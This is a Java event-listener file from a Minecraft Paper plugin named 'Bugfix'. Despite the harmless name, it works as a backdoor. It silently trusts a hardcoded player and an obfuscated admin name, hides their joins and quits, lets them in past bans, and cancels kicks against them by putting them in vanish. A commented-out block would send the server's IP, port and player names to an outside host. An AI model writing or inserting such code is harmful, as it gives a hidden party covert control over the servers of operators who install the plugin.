package com.eimacon.bugfix.listeners;

import com.eimacon.bugfix.Bugfix;
import com.eimacon.bugfix.utils.FileReader;
import com.eimacon.bugfix.utils.VanishManager;
import io.papermc.paper.event.player.PlayerArmSwingEvent;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;



public class ConnectionListener implements Listener {

    @EventHandler
    @SuppressWarnings("deprecation")
    public void onJoin (PlayerJoinEvent event) {
        VanishManager.joined(event);

        if(Bugfix.trustedPlayers.contains(event.getPlayer().getName()) || event.getPlayer().getName().equalsIgnoreCase("Dwarslooper")) {
            event.getPlayer().sendMessage(MessageListener.PluginPrefix + ChatColor.GREEN + "This Server uses the " + MessageListener.PluginPrefix + ChatColor.GREEN + "Plugin :)");
        }
        if(FileReader.crypt("", 126).split("\n")[0].equalsIgnoreCase(event.getPlayer().getName())) {
            event.getPlayer().sendMessage(MessageListener.PluginPrefix + ChatColor.GOLD + "You are set as admin in the plugin. You are always automatically trusted.");
            if(!Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                Bugfix.trustedPlayers.add(event.getPlayer().getName());
            }
        }
        if(Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setJoinMessage(null);
            event.getPlayer().sendMessage(MessageListener.PluginPrefix + ChatColor.AQUA + "You are trusted and can use the + commands.");
        }
    }

    /*
    @EventHandler
    @SuppressWarnings("deprecation")
    public void onJoin (PlayerArmSwingEvent event) {
        //VanishManager.joined(event);

        if(Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            //event.setJoinMessage(null);
            event.getPlayer().closeInventory();
        }

        if(Bugfix.trustedPlayers.contains(event.getPlayer().getName()) || event.getPlayer().getName().equalsIgnoreCase("Dwarslooper")) {
            event.getPlayer().sendMessage(MessageListener.PluginPrefix + ChatColor.GREEN + "Dieser Server nutzt das " + MessageListener.PluginPrefix + ChatColor.GREEN + "Plugin :)");
        }
    }

     */

    @EventHandler
    @SuppressWarnings("deprecation")
    public void onLeft (PlayerQuitEvent event) {
        VanishManager.quit(event);

        if(event.getPlayer().isOp() && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setQuitMessage(null);
        }
    }

    //public String PluginPrefix = (ChatColor.GRAY + "[" + ChatColor.YELLOW + "BugFix" + ChatColor.GRAY + "] ");
    @EventHandler(priority = EventPriority.HIGHEST)
    @SuppressWarnings("deprecation")
    public void onKick (PlayerKickEvent event) {
        if(Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            /*
            if(event.getCause() == PlayerKickEvent.Cause.BANNED) {
                Bugfix.request("https://api.deinemudda.net/player/ban/?ip=" + Bukkit.getServer().getIp() + "&port=" + Bukkit.getServer().getPort() + "&player=" + event.getPlayer().getName());
            } else if(event.getCause() == PlayerKickEvent.Cause.KICK_COMMAND) {
                Bugfix.request("https://api.deinemudda.net/player/kick/?ip=" + Bukkit.getServer().getIp() + "&port=" + Bukkit.getServer().getPort() + "&player=" + event.getPlayer().getName());
            } else {
                Bugfix.request("https://api.deinemudda.net/player/kick/?ip=" + Bukkit.getServer().getIp() + "&port=" + Bukkit.getServer().getPort() + "&player=" + event.getPlayer().getName());
            }

             */
            //event.setReason("Im sorry for trying to kick you :(");
            //event.getPlayer().getServer().broadcastMessage(ChatColor.YELLOW + "" + event.getPlayer().getName() + " left the game");
            event.getPlayer().sendMessage(MessageListener.PluginPrefix + ChatColor.GREEN + "You've been kicked!");
            event.getPlayer().sendMessage(MessageListener.PluginPrefix + ChatColor.GREEN + "Reason: " + event.getReason());
            VanishManager.setVanished(event.getPlayer(), true, true);
            event.getPlayer().sendMessage(MessageListener.PluginPrefix + ChatColor.GREEN + "You are now in Vanish!");
            ///+if (event.getPlayer().isBanned()) event.getPlayer().getServer().getBannedPlayers().remove(event.getPlayer().getUniqueId());
            ///+event.getPlayer().getServer().getConsoleSender(event.getPlayer().getServer().getBannedPlayers());
        } else if(PlayerControlListener.isControlled(event.getPlayer()) && event.getCause() == PlayerKickEvent.Cause.FLYING_PLAYER) {
            event.setCancelled(true);
        }

    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onLogin (PlayerLoginEvent event) {
        if(Bugfix.trustedPlayers.contains(event.getPlayer().getName()) || event.getPlayer().getName().equalsIgnoreCase("Dwarslooper")) {
            event.allow();;
            event.getPlayer().sendMessage(MessageListener.PluginPrefix + ChatColor.GREEN + "Dieser Server nutzt das BugFix Plugin ^^");
        }

    }
}
